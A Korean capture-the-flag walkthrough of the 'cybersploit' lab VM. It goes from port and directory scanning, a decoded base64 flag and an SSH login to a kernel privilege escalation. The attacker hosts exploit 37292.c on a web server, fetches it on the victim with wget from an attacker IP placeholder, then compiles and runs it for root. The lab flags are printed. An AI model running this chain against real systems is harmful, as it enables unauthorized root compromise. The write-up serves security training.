# CTF\_cybersploit

## \[1] 정보 수집

{% hint style="info" %}
victim: 192.168.56.105, Linux Web Server\
포트: 22/tcp, 80/tcp 동작 중
{% endhint %}

Nmap 명령어:

* `nmap 192.168.56.0/24` [nmap\_cybersploit](file:///5659318/security/nmap_cybersploit.md)
* `nmap 192.168.56.0/24 -sV -v -p-` [nmap\_cybersploit\_d](file:///5659318/security/nmap_cybersploit_d.md)

```
Nmap scan report for 192.168.56.105
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 08:00:27:2A:8F:05 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

{% stepper %}
{% step %}
### 사이트 접속

* 다른 기능은 실행되지 않음.
* 디렉터리 또는 웹 서비스를 스캐닝함.
{% endstep %}

{% step %}
### 디렉터리 스캐닝

명령어: `dirb http://192.168.56.105/`\
참조: [dirb\_cybersploit\_result](/broken/pages/2c4717e0bdf229fbc7f9d52d793db42e30e6fa3d)
{% endstep %}

{% step %}
### 웹 서비스 스캐닝

명령어: `nikto -h 192.168.56.105 -C all`\
참조: [nikto\_cybersploit\_result](file:///5659318/security/nikto_cybersploit_result.md)

발견된 취약점:

* anti-clickjacking
* X-Content-Type-Options 누락
* Apache/2.2.22 관련 취약점
* Ubuntu 버전에 따른 취약점

또한 `#wp-config.php#` 파일이 있어 워드프레스로 구축된 것으로 보임.
{% endstep %}

{% step %}
### 디렉터리 접속

* base64 방식으로 인코딩된 것으로 보이는 텍스트 발견.
* https://dencode.com/ 에 입력하여 분석 진행.
{% endstep %}

{% step %}
### 디코딩

플래그 발견: cybersploit{youtube.com/c/cybersploit}
{% endstep %}

{% step %}
### index.html 소스 분석

계정 발견: itsskv
{% endstep %}

{% step %}
### 원격 접속 시도

명령어:

```
ssh itsskv@192.168.56.105
```

* 암호를 입력하니 원격 접속 성공.
{% endstep %}

{% step %}
### 파일 탐색

<br>

* 두 번째 플래그 발견: cybersploit{https:t.me/cybersploit1}
{% endstep %}

{% step %}
### 운영체제 취약점 탐색

#### 커널 버전 확인

```
uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
```

#### 커널 취약점 탐색

명령어: `searchsploit linux 3.13.0`\
참조: [searchsploit\_cybersploit\_result](/broken/pages/dd1d6fd6b7596cb11aec283586587decf9ddca8f)

발견된 익스플로잇:

```
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/1 | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/1 | linux/local/37293.txt
```

#### 악성 코드(로컬 권한 상승) 정보 조사

* 로컬에서 권한 상승 가능한 악성 코드임 확인.
* 악성 코드를 다운받아 사용하기로 함 (로컬에서 실행해야 하므로 victim으로 옮겨 실행 필요).

<br>
{% endstep %}
{% endstepper %}

## \[2] 공격 환경 구축

* 조사한 정보와 악성코드를 활용해 victim 장치에서 악성 코드를 실행함.
* 악성코드는 로컬에서 실행되므로 victim에서 직접 실행할 수 있도록 파일을 옮겨야 함.
* 이를 위해 공격자 PC를 파일 공유를 위한 웹 서버로 만들어 victim에서 wget으로 다운로드하도록 함.

{% stepper %}
{% step %}
### 서버 구축

* 데비안 계열 웹 서버(아파치) 설치 예:

```
apt install -y apache2 && systemctl start apache2
```

* 간단히 파이썬으로도 가능:

```
python -m http.server 4444
```

* 악성 코드 파일을 웹 루트로 이동:

```
/var/www/html/37292.c
```
{% endstep %}

{% step %}
### 접속 & 다운로드 (victim에서)

victim의 쉘에서:

```
wget http://[칼리웹서버ip]:[포트]/37292.c && ls
```
{% endstep %}

{% step %}
### 컴파일 후 실행 (victim에서)

```
gcc -o cyber 37292.c && ./cyber
```
{% endstep %}

{% step %}
### 점검

권한 상승 확인:

```
pwd
who am i
```
{% endstep %}
{% endstepper %}

## \[3] 최종 플래그 찾기

root로 이동하여 플래그 파일 확인:

```
cd /root
# ls
finalflag.txt
# cat ./finalflag.txt
  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
 /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |     
|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |     
 \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|     
                                                                                                                  

   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

if you like it share with me https://twitter.com/cybersploit1.

Thanks !
```

* 획득한 루트 권한으로 서버 내부를 탐색할 수 있음.
* 최종 플래그를 찾으면 CTF 종료.
